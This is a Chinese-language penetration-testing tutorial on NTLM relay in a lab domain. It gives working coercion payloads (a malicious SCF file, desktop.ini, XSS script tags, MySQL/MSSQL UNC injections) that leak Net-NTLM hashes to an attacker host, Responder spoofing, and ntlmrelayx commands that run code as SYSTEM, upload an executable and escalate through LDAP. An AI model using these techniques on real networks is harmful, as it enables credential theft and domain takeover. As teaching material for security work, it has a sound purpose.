---
title: "NTLM Relay专题"
date: 2025-12-11T00:00:00+08:00
draft: false

---

# NTLM Relay专题

NTLM协议和NTLM Relay的相关概念已经在之前的文章中介绍过了， 这里直接从相关攻击方法以及步骤开始

### 发起并截获NTLM请求

消息传输依赖使用NTLM认证的上层协议，比如SMP、LDAP、HTTP、MSSQL，只要是使用这些上层协议的应用程序都可以发起NTLM请求，而我们可以使用responder拦截NTLM认证请求获取net-HTLM hash：

![image-20250118172157425](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250118172157425.png)

responder：[Releases · SpiderLabs/Responder](https://github.com/SpiderLabs/Responder)

#### 常用方法

通常通过设置指向恶意服务器的UNC路径，使目标主机自动向恶意服务器发起HTLM认证，方法如下：

##### 系统命令

使用能传入UNC路径的命令，比如：

~~~cmd
dir \\192.168.111.130\share
net use \\192.168.111.130\share
~~~

这样的命令还有很多，当我们发起认证responder即可成功截取net-NTLM hash v2：

![image-20250118172403764](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250118172403764.png)

##### desktop.ini

windows系统下有个隐藏文件desktop.ini，用于指定和存储文件夹图标之类的个性化设置，这里面的iconresource是文件夹的图标路径，可以改为指向恶意服务器的UNC，那么当主机请求图标资源时，即可截获htlm hash：

例如我将music文件夹的desktop.ini更改：

![image-20250118175004480](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250118175004480.png)

只要显示时请求图标即可截获htlm hash：

![image-20250118175110244](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250118175110244.png)

##### SCF文件

这是文件资源管理器命令文件，也是一个可执行文件，文件中的IconFile属性可以指定UNC路径，文件资源管理器会加载这个属性指定的文件图标，那么和上面同理：

在任意文件夹下创建test.scf文件：

~~~scf
[shell]
Command=2
IconFile=\\192.168.111.130\share\test.ico
[Taskbar]
Command=ToggleDesktop
~~~

用户访问该文件夹就会自动请求服务器，导致htlm hash被截获：

![image-20250118195649719](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250118195649719.png)

##### 文档类文件

PDF规范允许GoTobe和GoToR条目加载远程内容，测试人员可以在PDF中插入UNC路径，如果用户使用adobe reader打开pdf，则会发起HTLM请求

可以使用github上的badpdf进行生成恶意的PDF，这里不做赘述

该方法局限性很高，必须使用adobe reader才会触发NTLM认证

当然office也有类似的方法，可以学习一下

##### 打印机

Windows的MS-RPRN协议用于打印客户机和打印服务器之间的通信，默认情况下是启用的。协议定义的RpcRemoteFindFirstPrinterChangeNotificationEx()调用创建一个远程更改通知对象，该对象监视对打印机对象的更改，并将更改通知发送到打印客户端。

任何经过身份验证的域成员都可以连接到远程服务器的打印服务（spoolsv.exe），并请求对一个新的打印作业进行更新，令其将该通知发送给指定目标。之后它会将立即测试该连接，即向指定目标进行身份验证（攻击者可以选择通过Kerberos或NTLM进行验证）。

通过脚本[PetitPotem](https://github.com/topotam/PetitPotam)可以让目标机器强制回连

但是由于机器版本问题，使用printerbug很可能出问题(函数调用问题)，可以使用[Coercer](https://github.com/p0dalirius/Coercer)进行函数fuzz测试，比较好用

#### web层面的利用

##### XSS

使用src标签请求恶意服务器发起NTLM认证

如果用UNC路径：

~~~html
<script src="\\192.168.111.130\xss">
~~~

这种情况适用于IE和edge，能够直接截获ntlm hash

如果通过http：

~~~html
<script src="//192.168.30.130/xss">
~~~

这样的标签访问页面会弹出认证框，需要用户登录后才能截获htlm hash

##### 文件包含

同理了，文件包含函数支持解析UNC路径

当然，XXE、SSRF都可以尝试这样利用

##### sql注入

windows上安装的mysql中1，load_file、into dumpfile等常见函数同样支持UNC路径：

~~~mysql
select load_file('\\\\192.168.111.130\\file')
# 唯一有变化的是这里的\要用\\来转义一下
~~~

mssql可以调用xp_fileexist、xp_create_subdir、xp_dirtree等函数进行利用：

~~~mssql
exec master.sys.xp_dirtree '\\192.168.111.130\share';
~~~

#### NBNS&LLMNR欺骗利用

windows 解析域名的顺序是

- Hosts
- DNS (cache / server)
- LLMNR
- NBNS

如果Hosts文件里面不存在，就会使用DNS解析。如果DNS解析失败，就会使用LLMNR解析，如果LLMNR解析失败，就会使用NBNS解析

LLMNR 是一种基于协议域名系统（DNS）数据包的格式，使得两者的IPv4和IPv6的主机进行名称解析为同一本地链路上的主机，因此也称作多播 DNS

LLMNR 进行名称解析的过程为：

- 检查本地 NetBIOS 缓存
- 如果缓存中没有则会像当前子网域发送广播
- 当前子网域的其他主机收到并检查广播包，如果没有主机响应则请求失败

有没有感觉和ARP类似，所以这里的利用也和ARP欺骗类似，而responder只要正在监听就可以自动响应上面提到的广播：

* 请求不存在的域名：

  ![image-20250118204100209](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250118204100209.png)

* 自动截获：

  ![image-20250118204136702](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250118204136702.png)

etBIOS 协议进行名称解析的过程如下：

- 检查本地 NetBIOS 缓存
- 如果缓存中没有请求的名称且已配置了 WINS 服务器，接下来则会向 WINS 服务器发出请求
- 如果没有配置 WINS 服务器或 WINS 服务器无响应则会向当前子网域发送广播
- 如果发送广播后无任何主机响应则会读取本地的 lmhosts 文件

lmhosts 文件位于`C:\Windows\System32\drivers\etc\`目录中。

NetBIOS 协议进行名称解析是发送的 UDP 广播包。因此在没有配置 WINS 服务器的情况底下，LLMNR协议存在的安全问题，在NBNS协议里面同时存在

方法和上面一样，不做赘述

### relay to SMB

relay到SMB可以直接获取目标服务器本地控制权，这是NTLM relay 最经典的利用方式

#### SMB签名

分为服务端签名和客户端签名，如果启用了服务端签名，则客户端无法与该服务器建立会话，默认情况下，工作站、服务器、域控上会启用服务端签名；同理，如果启用了客户端SMB签名，这个客户端就无法与未启用数据包签名的服务器建立会话，默认情况下，仅在域控上启用服务端SMB签名

responder有内置工具用于扫描内网主机SMB签名情况：

~~~shell
python RunFinger.py -i 192.168.111.0/24 
~~~

#### 域环境下的利用

AD域中，因为所有用户的hash都存放于活动目录数据库，所以可以直接将域用户的NTLM请求relay到其他机器（前提是域用户登录不受限且机器没有开启签名）

可以使用impacket中的ntlmrelayx.py进行relay：

* 启动监听：

  ~~~shell
  python ntlmrelayx.py -t smb://192.168.111.128 -c whoami -smb2support
  ~~~

  ![image-20250119191333583](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250119191333583.png)

* 使用上面提到过的方法在诱导client（我这里使用DC）触发ntlm认证：

  ![image-20250119192126670](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250119192126670.png)

* 脚本会将获得的htlm hash relay到参数指定的server（我这里使用域成员主机）：

  ![image-20250119192201043](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250119192201043.png)

  可以看见不仅执行whoami，还是system权限

* 同理，这个脚本还能上传文件：

  ~~~sh
  python ntlmrelayx.py -t smb://192.168.111.128 -e /root/artifact.exe -smb2support
  ~~~

#### 工作组的利用

在工作组中，用户的hash保存在各自主机的SAM文件中，所以很难将一台主机的NTLM请求relay到其他主机，所以通常采取NTLM reflect，也有人称之为反射，在之前的权限提升部分访问令牌操纵ms08-068以及其补丁版本漏洞ghost potato文章中提到过，这里不再赘述

### relay to exchange

可以使用ntlm relay接管目标主机用户的exchange邮箱，但国内使用exchange邮箱服务的单位非常罕见，并且有更过更好的利用方式，这里就只简单提及不细说了

### relay to ldap

可以使用ntlm relay to ldap来接管域中的活动目录

有三种通用性比较强的利用思路，这三种在impacket里面的ntlmrelayx都有实现

#### 高权限用户

如果NTLM发起用户在以下用户组

- Enterprise admins
- Domain admins
- Built-in Administrators
- Backup operators
- Account operators

那么就可以将任意用户拉进该组，从而使该用户称为高权限用户，比如域管

#### Write Acl 权限

如果发起者对`DS-Replication-GetChanges(GUID: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)`和`DS-Replication-Get-Changes-All(1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)`有write-acl 权限，那么就可以在该acl里面添加任意用户，从而使得该用户可以具备dcsync的权限

这个案例的典型例子就是Exchange Windows Permissions组。

#### 普通用户权限RBCD

对于一个普通的域用户，可能会需要用到基于资源的约束委派，但前提是这个普通域用户能够修改目标主机的属性，能够创建机器账户。

满足这两个条件就能够使用资源约束委派了。详细可以看委派攻击的地方
